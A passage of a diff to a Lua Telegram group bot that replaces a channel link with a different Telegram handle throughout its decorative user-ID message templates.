+send(msg.chat_id_, msg.id_, '\n 🌕 الصوره ⇜ ليس لديك صور في حسابك'..'[\n|• 𝒖𝒔𝒆𝒓 → ↝'..username..'↜\n|• 𝒎𝒔𝒈𝒔→ ↝'..Msguser..'↜\n|• 𝒊𝒅 →  ↝'..msg.sender_user_id_..'↜\n|• 𝒄𝒉→  ↝@A_F_fwdka1 ↜\n')
 end 
 end
 end
@@ -15348,7 +15353,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n|• 𝒖𝒔𝒆𝒓 →  ↝'..username..'↜   ↝🖤༆\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜   ↝🖤༆\n|• 𝒓𝒂𝒏𝒌 → ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜   ↝🖤༆\n|• 𝒊𝒅 →  ↝'..msg.sender_user_id_..'↜   ↝🖤༆\n|• 𝒄𝒉→ ↝https://t.me/surccesezr↜   ↝🖤༆\n')
+send(msg.chat_id_, msg.id_,'[\n|• 𝒖𝒔𝒆𝒓 →  ↝'..username..'↜   ↝🖤༆\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜   ↝🖤༆\n|• 𝒓𝒂𝒏𝒌 → ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜   ↝🖤༆\n|• 𝒊𝒅 →  ↝'..msg.sender_user_id_..'↜   ↝🖤༆\n|• 𝒄𝒉→ ↝@A_F_fwdka1↜   ↝🖤༆\n')
 end
 end
 
@@ -15443,12 +15448,12 @@ else
 username = 'لا يوجد '
 end
 if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n|• 𝚄??𝙴𝚁 ↬  ↝'..username..'↜     ↝💘\n|• ??𝚂𝙶𝚂↬  ↝'..Msguser..'↜     ↝💘\n|• 𝚁𝙰𝙽𝙺↬ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜     ↝💘\n|• 𝙸𝙳↬   ↝'..msg.sender_user_id_..'↜    ↝💘\n|• 𝒄𝒉↬  ↝https://t.me/surccesezr↜     ↝💘\n')
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n|• 𝚄??𝙴𝚁 ↬  ↝'..username..'↜     ↝💘\n|• ??𝚂𝙶𝚂↬  ↝'..Msguser..'↜     ↝💘\n|• 𝚁𝙰𝙽𝙺↬ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜     ↝💘\n|• 𝙸𝙳↬   ↝'..msg.sender_user_id_..'↜    ↝💘\n|• 𝒄𝒉↬  ↝@A_F_fwdka1↜     ↝💘\n')
 else 
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
-send(msg.chat_id_, msg.id_,'[\n|• 𝚄𝚂𝙴𝚁 ↬  ↝'..username..'↜    ↝💘\n|• 𝙼𝚂𝙶𝚂↬ ↝'..Msguser..'↜.   ↝💘\n|• 𝚁𝙰𝙽𝙺↬ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜    ↝💘\n|• 𝙸𝙳↬  ↝'..msg.sender_user_id_..'↜    ↝💘\n|• 𝒄𝒉↬   ↝https://t.me/surccesezr↜    ↝💘\n')
+send(msg.chat_id_, msg.id_,'[\n|• 𝚄𝚂𝙴𝚁 ↬  ↝'..username..'↜    ↝💘\n|• 𝙼𝚂𝙶𝚂↬ ↝'..Msguser..'↜.   ↝💘\n|• 𝚁𝙰𝙽𝙺↬ ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜    ↝💘\n|• 𝙸𝙳↬  ↝'..msg.sender_user_id_..'↜    ↝💘\n|• 𝒄𝒉↬   ↝@A_F_fwdka1↜    ↝💘\n')
 else
-send(msg.chat_id_, msg.id_, '\n 🌕 الصوره ⇜ ليس لديك صور في حسابك'..'[\n|• 𝚄𝚂𝙴𝚁 ↬ ↝'..username..'↜\n|• 𝙼𝚂𝙶𝚂↬ ↝'..Msguser..'↜\n|• 𝙸𝙳↬  ↝'..msg.sender_user_id_..'↜\n|• 𝒄𝒉↬  ↝https://t.me/surccesezr↜\n')
+send(msg.chat_id_, msg.id_, '\n 🌕 الصوره ⇜ ليس لديك صور في حسابك'..'[\n|• 𝚄𝚂𝙴𝚁 ↬ ↝'..username..'↜\n|• 𝙼𝚂𝙶𝚂↬ ↝'..Msguser..'↜\n|• 𝙸𝙳↬  ↝'..msg.sender_user_id_..'↜\n|• 𝒄𝒉↬  ↝@A_F_fwdka1↜\n')
 end 
 end
 end
@@ -15466,7 +15471,7 @@ get_id_text = get_id_text:gsub('#game',NUMPGAME)
 get_id_text = get_id_text:gsub('#photos',photps) 
 send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
 else
-send(msg.chat_id_, msg.id_,'[\n|• 𝒖𝒔𝒆𝒓 → ↝'..username..'↜   🖤༆\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜   🖤༆\n|• 𝒓𝒂𝒏𝒌 → ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜   🖤༆\n|• 𝒊𝒅  →   ↝'..msg.sender_user_id_..'↜   🖤༆\n|• 𝒄?? → ↝ https://t.me/surccesezr ↜   🖤༆\n')
+send(msg.chat_id_, msg.id_,'[\n|• 𝒖𝒔𝒆𝒓 → ↝'..username..'↜   🖤༆\n|• 𝒎𝒔𝒈𝒔 → ↝'..Msguser..'↜   🖤༆\n|• 𝒓𝒂𝒏𝒌 → ↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜   🖤༆\n|• 𝒊𝒅  →   ↝'..msg.sender_user_id_..'↜   🖤༆\n|• 𝒄?? → ↝ @A_F_fwdka1 ↜   🖤༆\n')
 end
 end
 
@@ -15583,7 +15588,7 @@ local List = {
 𖤍 |↶ #username    ꙰🇪🇬.
 𖤍 |↶ #msgs    ꙰🇪🇬.
 𖤍 |↶ #stast    ꙰🇪🇬.
-𖤍 |↶ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𖤍 |↶ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -15592,7 +15597,7 @@ local List = {
  𝗦𝗧𝗔 ⟿ #stast  « 
  𝗜𝗗  ⟿ #id  « 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-???? - ↝https://t.me/surccesezr↜ 🌕 .
+???? - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 🇪🇬≪💎≫ #username • メ
@@ -15600,21 +15605,21 @@ local List = {
 🇪🇬≪💎≫ #id  • メ
 🇪🇬≪💎≫ #msgs  •メ
 🇪🇬≪💎≫ #game •メ
-🇪🇬𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+🇪🇬𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
  𝚄𝚂𝙴𝚁 𓄹𓄼 #username
  𝙸𝙳  ??𓄼 #id 
  𝚂𝚃𝙰 𓄹𓄼 #stast 
  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
- 𝗖𝗛 - ↝https://t.me/surccesezr↜ ??.
+ 𝗖𝗛 - ↝@A_F_fwdka1↜ ??.
 ]],
 [[
 𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
 ??➪ : Iᗪ : #id - ❦ . 
 𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
 𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
-𓅓➪ : 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+𓅓➪ : 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 - ايديڪ  ⁞ #id 💘 ٬
@@ -15622,14 +15627,14 @@ local List = {
 - رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
 - رتبتڪ الحلوه ⁞ #stast  💘٬
 - سحڪاتڪ الفول ⁞ #edit 💘 ٬
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
 𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
 𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
 𓁷 - 𝙞?? †: #id 𓀀 .
-𓁷 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+𓁷 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 𖡋 𝐔𝐒𝐄 #username 
@@ -15637,7 +15642,7 @@ local List = {
 𖡋 𝐒𝐓𝐀 #stast 
 𖡋 𝐈𝐃 #id 
 𖡋 𝐄𝐃𝐈𝐓 #edit
-𖡋 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𖡋 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
@@ -15645,7 +15650,7 @@ local List = {
 𖤂 ~ 𝑠𝑡𝑎 #stast  
 𖤂 ~ 𝑖𝑑 #id 𖤐
 𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
-𖤂 ~ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𖤂 ~ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ••• ••• ••• ••• ••• ••• ••• 
@@ -15654,14 +15659,14 @@ local List = {
  ࿕|• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
  ࿕|• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
 ••• ••• ••• ••• ••• ••• •••
- ࿕|• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+ ࿕|• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
 ► 𝗜𝗗 #id 𓃚 ꙰
 ► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
 ► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
-► 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+► 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 -↯   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
@@ -15669,14 +15674,14 @@ local List = {
 -↯   𝙸𝙳 . #id 🇪🇬 ꙰ 
 -↯   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
 -↯   𝙼𝚂𝙶𝚂 . #msgs 🇪?? ꙰
--↯   ??𝗛 - ↝https://t.me/surccesezr↜ 🇪🇬 ꙰.
+-↯   ??𝗛 - ↝@A_F_fwdka1↜ 🇪🇬 ꙰.
 ]],
 [[
 - UsEr🇪🇬 ꙰ #username
 - StA🇪🇬 ꙰   #msgs
 - MsGs🇪🇬 ꙰ #stast
 - ID🇪🇬 ꙰  #id
-- 𝗖𝗛 🇪🇬 ꙰  ↝https://t.me/surccesezr↜ 💞.
+- 𝗖𝗛 🇪🇬 ꙰  ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -15685,14 +15690,14 @@ local List = {
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
 🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 - 𝗖?? - ↝https://t.me/surccesezr↜ 🌕 .
+🇪🇬 - 𝗖?? - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 - 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
 - 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
 - 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
 - 𓏬 𝐈𝐃 : #id 𓂅 .
-- 𓏬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+- 𓏬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
@@ -15700,28 +15705,28 @@ local List = {
 ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
 ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
 ᯓ 𝟔𝟔𝟔𖡋 #game •✟
-ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
  🌕 •𝐮𝐬𝐞𝐫 : #username 𖣬  
  🌕 •𝐦𝐬𝐠  : #msgs 𖣬 
  🌕 •𝐬𝐭𝐚 : #stast 𖣬 
  🌕 •𝐢𝐝  : #id 𖣬
- 🌕 •𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+ 🌕 •𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 - ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
 - ᴍѕɢѕ ➣ #msgs .
 - ѕᴛᴀᴛѕ ➣ #stast .
 - ʏᴏᴜʀ ɪᴅ ➣ #id  .
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 - ᴜѕʀ: #username ঌ.
 - ᴍѕɢ: #msgs  ঌ.
 - ѕᴛᴀ: #stast  ঌ.
 - ɪᴅ: #id ঌ.
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 - 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
@@ -15729,14 +15734,14 @@ local List = {
 - 𝑖𝑑 ⟿ #id
 - 𝑒𝑑𝑖𝑡 ⟿ #edit
 - 𝑔𝑎𝑚𝑒 ⟿ #game
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+⌔➺: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -15745,28 +15750,28 @@ local List = {
 🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
 🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 ꙰  - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+🇪🇬 ꙰  - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 🌯|✙• 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
 🌯|✙• 𝐦𝐬𝐠 ➢ ⁞  #msgs  📝
 🌯|✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
 🌯|✙• 𝐢𝐝 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
-🌯| 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+🌯| 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 |• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪??.
 |• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
 |• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
 |• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
-|• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+|• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
 ➞: 𝒖??𝒆𝒓𓂅 #username 𓍯➸💞.
 ➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
 ➞: 𝐢𝐝 𓂅 #id 𓍯➸💞.
-➞: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+➞: 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ➼ : 𝐼𝐷 𖠀 #id . ♡
@@ -15774,14 +15779,14 @@ local List = {
 ➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
 ➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
 ➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
-➼ : 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+➼ : 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ▽|❀• USER ➭ ⁞ #username .
 ▽|❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
 ▽|❀• STAT ➬ ⁞ #stast  .
 ▽|❀• 𝙸𝙳  ➬ ⁞ #id  .
-▽|❀• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+▽|❀• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
@@ -15789,14 +15794,14 @@ local List = {
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
 • ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
-• ❉ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+• ❉ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 |USERNAME #username 𓃚
 | YOUR -ID - #id 𓃚
 | STAS-#stast 𓃚
  | MSAG - #msgs 𓃚
- | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+ | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 𝟔𝟔𝟔 𖡋 #username • 𖣰💞
@@ -15804,14 +15809,14 @@ local List = {
 𝟔𝟔𝟔 𖡋 #id • 𖣰💞
 𝟔𝟔𝟔 𖡋 #game • 𖣰💞
 𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
-𝟔𝟔𝟔 𖡋 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𝟔𝟔𝟔 𖡋 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+⌔➺: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
  🌕 - 𝓾𝓼𝓮𝓻 ➪ #username 🌕 .
@@ -15819,42 +15824,42 @@ local List = {
  🌕 - 𝓲𝓭 ➪ #id ⸙ 🌕 .
  🌕 - 𝓰??𝓪𝓼 ➪ #gmas ⸙ 🌕 .
  🌕 - 𝓶𝓼??𝓼 ➪ #msgs 🌕 .
- 🌕 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+ 🌕 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 - 𝄬 username . #username ➪🇪🇬
  - 𝄬 stast . #stast ➪🇪🇬
  - 𝄬 id . #id ➪🇪🇬
  - 𝄬 msgs . #msgs ➪🇪🇬
- - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+ - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
 ◣: 𝐮𝐬𝐞𝐫?? #username 𓍯➥♡.
 ◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
 ◣: 𝐢𝐝 𓂅 #id 𓍯➥♡.
-◣: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+◣: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ↣• USE ➤ #username  ↝🍬.
 ↣• MSG ➤  #msgs  ↝🍬.
 ↣• STA ➤  #stast  ↝🍬.
 ↣• iD ➤ #id  ↝🍬.
-↣• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+↣• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ➫✿: S #stast 𓍯➟♡.
 ➫✿: U𓂅 #username 𓍯➟♡.
 ➫✿: M𓂅 #msgs 𓍯➟♡.
 ➫✿:  I  #id ➟♡.
-➫✿: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+➫✿: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝐢𝐝 𓂅 #id 𓍯↝❃.
-✶- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+✶- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 • 🖤 | 𝑼𝑬𝑺 :  #username
@@ -15865,14 +15870,14 @@ local List = {
 
 • 🖤 | 𝑴𝑺𝑮 : #msgs
 
-• 🖤 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+• 🖤 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 • USE 𖦹 #username 
 • MSG 𖥳 #msgs  
 • STA 𖦹 #stast 
 • iD 𖥳 #id
-• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+• 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 - ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
@@ -15882,7 +15887,7 @@ local List = {
 - ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
 - ᴅᴇᴛᴀɪʟs ➣ #auto . 
 -  ɢᴀᴍᴇ ➣ #game .
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ⚕𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : #username
@@ -15891,7 +15896,7 @@ local List = {
 ⚕𝙄𝘿 : #id
 ⚕𝙅𝙀𝙒𝙀𝙇𝙎 : #game
 ⚕𝘿𝙀𝙑 : #ridha
-⚕𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+⚕𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 • 🦄 | ??𝑬𝑺 : #username ‌‌‏⚚
@@ -15899,7 +15904,7 @@ local List = {
 • 🦄 | 𝑰𝑫 : #id ‌‌‏♕
 • 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
 • 🦄 | 𝑾??𝒍𝒄𝒐𝒎𝒆 : ⁞
-• 🦄 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+• 🦄 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 • △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
@@ -15907,7 +15912,7 @@ local List = {
 • ⊠ | 𝑰𝑫 : #id ‌‌‏♕
 • ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
 • ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
-• ❏ | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+• ❏ | 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ┇iD ➺ #id 💘
@@ -15915,7 +15920,7 @@ local List = {
 ┇MsG ➺ #msgs 🧸 
 ┇StAtE ➺ #stast 🎀
 ┇EdIT ➺ #edit  💒
-┇𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+┇𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 ★
@@ -15923,7 +15928,7 @@ local List = {
 • 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
 • 🖤 | 𝑰𝑫 : #id ‌‌‏♕
 • 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
-• 🖤 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+• 🖤 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ┄─━━ 🌕 ━━─┄
@@ -15934,14 +15939,14 @@ local List = {
 𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
 ✰ ᴄʜ ᴇʟɪɴ ➣ #edit
 ┄─━━ 🌕 ━━─┄
-✰ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+✰ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
 𓄼 ѕᴛᴀ : #stast ☥
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊
-?? 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+?? 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 • ﮼ايديك  #id 🌻 ٬
@@ -15949,7 +15954,7 @@ local List = {
 • ﮼مسجاتك ➺ #msgs 🌻 ٬
 •  ﮼رتبتك➺ #stast 🌻 ٬
 • ﮼تعديلك ➺ #edit 🌻 ٬
-• ﮼ تعين ➺ ↝https://t.me/surccesezr↜ 💞.
+• ﮼ تعين ➺ ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ‎⿻┊Yor iD 𖠄 #id ٫
@@ -15957,15 +15962,15 @@ local List = {
 ‌‎⿻┊MsGs 𖠄 #msgs ٫
 ‌‎⿻┊StAtS 𖠄 #stast ٫
 ‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
-‌‎⿻┊‌‎𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+‌‎⿻┊‌‎𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
  🌕 | 𝐢𝐝  𓃠 #id .
  🌕 | 𝐮𝐬??𝐫 𓃠 #username .
  🌕 | 𝐦𝐬𝐠 𓃠 #msgs .
  🌕 | 𝐬??𝐚 𓃠 #stast .
- 🌕 | 𝒆𝒅𝒊𝒕 𓃠 #edit .
- 🌕 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+ ?? | 𝒆𝒅𝒊𝒕 𓃠 #edit .
+ 🌕 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ♡ : 𝐼𝐷 𖠀 #id .
@@ -15973,49 +15978,49 @@ local List = {
 ♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
 ♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
 ♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
-♡ : 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+♡ : 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 •ᑌᔕᗴᖇ- #username 
 •ᔕTᗩ- #stast 
 •ᗰᔕ- #msgs 
 •Iᗪ- #id
-•𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+•𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 • USE ➤ #username  .
 • MSG ➤  #msgs  .
 • STA ➤  #stast  .
 • iD ➤ #id  .
-• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+• 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
 𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
 𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
 𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
-𝗖𝗛☤🇪🇬 - ↝https://t.me/surccesezr↜ 🌕 .
+𝗖𝗛☤🇪🇬 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ⭐️𝖘𝖙𝖆 : #stast ـ🍭
 ⭐️𝖚𝖘𝖊𝖗??𝖆𝖒𝖊 : #username ـ🍭
 ⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
